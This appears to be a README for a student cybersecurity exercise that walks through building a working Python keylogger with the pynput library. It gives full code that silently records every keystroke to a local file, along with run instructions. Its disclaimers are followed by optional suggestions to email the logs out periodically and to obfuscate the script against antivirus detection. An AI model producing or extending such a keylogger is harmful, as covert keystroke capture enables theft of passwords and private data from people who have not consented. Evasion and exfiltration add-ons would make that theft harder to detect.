# PRODIGY_CS_04
# Simple Keylogger

Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. 

Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

* Ethical Considerations: Only use keyloggers for ethical purposes, such as testing your own systems or with explicit permission. Unauthorized use is illegal and unethical.

* Dependencies: We'll use the pynput library to capture keystrokes.


* Basic Workflow:

Capture keystrokes.
Record the keystrokes in a log file.


## Step-by-Step Implementation

### 1. Set Up Your Environment
First, make sure you have Python installed. You'll also need to install the pynput library. You can do this using pip:

pip install pynput

### 2. Import Necessary Libraries

from pynput.keyboard import Key, Listener
import logging

### 3. Set Up Logging

log_dir = ""  # You can specify a directory if needed
logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

### 4. Define the Callback Function to Capture Keystrokes

def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))


### 5. Set Up and Start the Listener

with Listener(on_press=on_press) as listener:
    listener.join()


# Explanation of the Code

1. Imports: We import the necessary modules from pynput to listen to keyboard events and logging for recording the keystrokes.
 
2. Logging Configuration: We set up logging to record keystrokes to a file named key_log.txt.

3. Callback Function (on_press): This function is called every time a key is pressed. It logs the key pressed. If the key has a special representation (like Key.space), it logs a more readable message.

4. Listener: This is the main part of the program that listens for key presses and calls the on_press function whenever a key is pressed.

# Running the Keylogger

1. Save the script to a file, e.g., keylogger.py.

2. Run the script using Python:

python keylogger.py

# Stopping the Keylogger

To stop the keylogger, you can terminate the script (e.g., using Ctrl+C in the terminal).

## Important Notes

Permissions: Always ensure you have permission to use a keylogger on any system. 

Unauthorized use is illegal.

Security: Store and handle logged data securely to avoid misuse.

## Ethical Use Cases

Personal Use: Monitor your own computer to track keystrokes for personal analysis.

Parental Control: Monitor children's computer usage with consent and proper guidance.

Testing: Use in a controlled environment to test security software or systems.

## Additional Features (Optional)

Capture Keystroke Timing: Modify the logging format to include timestamps.

Send Logs via Email: Set up a function to periodically send the log file to a specified email address.

Obfuscation: Make the script less detectable by antivirus software (ensure ethical use).
